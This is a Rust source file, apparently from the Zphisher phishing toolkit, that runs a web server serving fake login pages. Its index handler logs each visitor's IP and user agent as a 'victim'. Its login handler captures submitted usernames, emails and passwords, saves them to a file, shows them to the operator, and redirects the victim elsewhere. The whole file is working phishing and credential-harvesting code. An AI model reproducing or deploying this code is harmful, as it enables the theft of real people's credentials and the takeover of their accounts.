use std::fs::OpenOptions;
use std::io::Write;
use std::path::PathBuf;
use std::process::exit;
use actix_files::NamedFile;
use actix_web::{get, post, middleware, http, web, App, HttpRequest, HttpResponse, HttpServer, Responder};
use crate::cli::{clear_terminal, error_msg, notify_msg};
use actix_cors::Cors;
use actix_web::http::header;
use actix_web::http::header::HeaderValue;
use actix_web::web::{Data, Form};
use colored::Colorize;
use crate::constants::{HOST, PORT};
use crate::zphisher::banner_small;
use serde::Deserialize;
use crate::helpers::get_data_dir;


#[get("/")]
async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
    let client_ip = req.connection_info().realip_remote_addr().unwrap_or("<unknown>").to_string();
    let user_agent = match req.headers().get(header::USER_AGENT) {
        Some(user_agent) => match user_agent.to_str() {
            Ok(user_agent) => user_agent,
            Err(err) => {
                error_msg(&err.to_string());
                exit(1);
            }
        },
        None => "",
    };

    // println!("Client IP: {}", client_ip);
    // println!("User Agent: {}", user_agent);

    let ip_dir = match get_data_dir() {
        Some(auth_dir) => auth_dir,
        None => {
            error_msg("Unable to get data directory");
            exit(1);
        }
    }.join("zphisher").join("auth").join("ip.txt");

    // Create ip.txt file if it doesn't exist
    if !ip_dir.exists() {
        if let Err(e) = OpenOptions::new().write(true).create(true).open(&ip_dir) {
            error_msg(&format!("Couldn't create ip.txt file: {}", e));
            exit(1);
        }
    }

    let mut file = OpenOptions::new().write(true).append(true).open(&ip_dir).unwrap_or_else(|err| {
        error_msg(&format!("Couldn't open ip.txt file: {}", err));
        exit(1);
    });

    let formatted_ip = format!("IP: {}\nUser-Agent: {}", client_ip, user_agent);

    if let Err(e) = writeln!(file, "{}", formatted_ip) {
        error_msg(&format!("Couldn't write to file: {}", e));
        exit(1);
    }

    notify_msg(&format!("{}\n", "Victim IP found!".green()));
    notify_msg(&format!("{} {}\n", "Victim's IP:".green(), client_ip.bright_blue()));
    notify_msg(&format!("{} {}\n", "ip.txt file saved at".green(), ip_dir.display().to_string().green()).green());
    notify_msg(&format!("{}\n", "IP address saved to ip.txt".green()));
    notify_msg(&format!("{}\n", "User-Agent saved to ip.txt".green()));


    let user_agent = match req.headers().get(header::USER_AGENT) {
        Some(user_agent) => match user_agent.to_str() {
            Ok(user_agent) => user_agent,
            Err(err) => {
                error_msg(&err.to_string());
                exit(1);
            }
        },
        None => "",
    };


    let file_name = if is_mobile(user_agent) {
        if !data.get_ref().join("mobile.html").exists() {
            "login.html"
        } else {
            "mobile.html"
        }
    } else { "login.html" };

    let file_path = data.get_ref().join(file_name);
    let file = match NamedFile::open(file_path) {
        Ok(file) => file,
        Err(err) => {
            error_msg(&err.to_string());
            exit(1);
        }
    };
    let mut response = file.into_response(&req);
    response.headers_mut().insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("text/html"),
    );
    response.headers_mut().insert(
        header::CACHE_CONTROL,
        HeaderValue::from_static("no-store"),
    );
    response
}


#[derive(Debug, Deserialize)]
pub struct LoginForm {
    username: Option<String>,
    email: Option<String>,
    password: String,
}

pub struct Config {
    pub redirect_url: String,
}

#[post("/login")]
async fn login(
    form: Form<LoginForm>,
    config: Data<Config>,
) -> impl Responder {
    let mut success_counter: u8 = 0;


    let data_dir = match get_data_dir() {
        Some(auth_dir) => auth_dir,
        None => {
            error_msg("Unable to get data directory");
            exit(1);
        }
    }.join("zphisher").join("auth").join("usernames.dat");


    if !data_dir.exists() {
        if let Err(e) = OpenOptions::new().write(true).create(true).open(&data_dir) {
            error_msg(&format!("Couldn't create usernames.dat file: {}", e));
            exit(1);
        }
    }

    let mut file = OpenOptions::new().write(true).append(true).open(&data_dir).unwrap_or_else(|err| {
        error_msg(&format!("Couldn't open usernames.dat file: {}", err));
        exit(1);
    });


    if let Some(username) = &form.username {
        success_counter += 1;
        notify_msg(&format!("{}\n", "Login info found!".green()));
        notify_msg(&format!("{} {}\n", "Account:".green(), username.bright_blue()));
        // write to file
        match writeln!(file, "Account: {}", username) {
            Ok(_) => {}
            Err(e) => {
                error_msg(&format!("Couldn't write to file: {}", e));
                exit(1);
            }
        };
    } else if let Some(email) = &form.email {
        success_counter += 1;
        notify_msg(&format!("{}\n", "Login info found!".green()));
        notify_msg(&format!("{} {}\n", "Account:".green(), email.bright_blue()));
        // write to file
        match writeln!(file, "Account: {}", email) {
            Ok(_) => {}
            Err(e) => {
                error_msg(&format!("Couldn't write to file: {}", e));
                exit(1);
            }
        };
    }

    success_counter += 1;
    notify_msg(&format!("{} {}\n", "Password:".green(), &form.password.bright_blue()));
    // write to file
    match writeln!(file, "Password: {}", &form.password) {
        Ok(_) => {}
        Err(e) => {
            error_msg(&format!("Couldn't write to file: {}", e));
            exit(1);
        }
    };

    if success_counter == 2 || success_counter == 3 {
        notify_msg(&format!("{} {}\n", "Credentials saved to".green(), data_dir.display().to_string().green()));
    }


    HttpResponse::Found().append_header(("Location", config.redirect_url.as_str())).finish()
}

async fn not_found() -> HttpResponse {
    HttpResponse::Found().append_header(("Location", "/")).finish()
}

#[get("/favicon.{ext}")]
async fn favicon(ext: web::Path<String>, data: Data<PathBuf>, req: HttpRequest) -> Result<HttpResponse, actix_web::Error> {
    let favicon_path = data.get_ref().join(format!("favicon.{}", ext.into_inner()));
    let file = match NamedFile::open(favicon_path) {
        Ok(file) => file,
        Err(_) => return Ok(HttpResponse::new(http::StatusCode::NOT_FOUND)),
    };
    let mut response = file.into_response(&req);
    response.headers_mut().insert(
        header::CACHE_CONTROL,
        HeaderValue::from_static("no-store"),
    );
    Ok(response)
}


fn is_mobile(user_agent: &str) -> bool {
    user_agent.contains("Mobile") || user_agent.contains("Android") || user_agent.contains("iPhone")
}

pub async fn start_webserver(static_files: PathBuf, port: Option<u16>, redirect_url: String) -> std::io::Result<()> {
    match clear_terminal() {
        Ok(_) => {}
        Err(err) => {
            error_msg(&err.to_string());
            exit(1);
        }
    }
    banner_small();
    let port: u16 = port.unwrap_or(PORT);

    notify_msg(&format!("{} {}\n", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, port).cyan()));
    println!("{}", "Press Ctrl+C to exit\n".yellow());

    HttpServer::new(move || {
        App::new().wrap(middleware::Compress::default()).wrap(
            Cors::default().allow_any_origin().allow_any_method().allow_any_header()
        ).service(index).service(favicon).service(login).default_service(web::route().to(not_found)).service(actix_files::Files::new("/", static_files.clone())).app_data(Data::new(static_files.clone())).app_data(Data::new(Config {
            redirect_url: redirect_url.clone()
        }))
    }).bind(("127.0.0.1", {
        port
    }))?.run().await
}

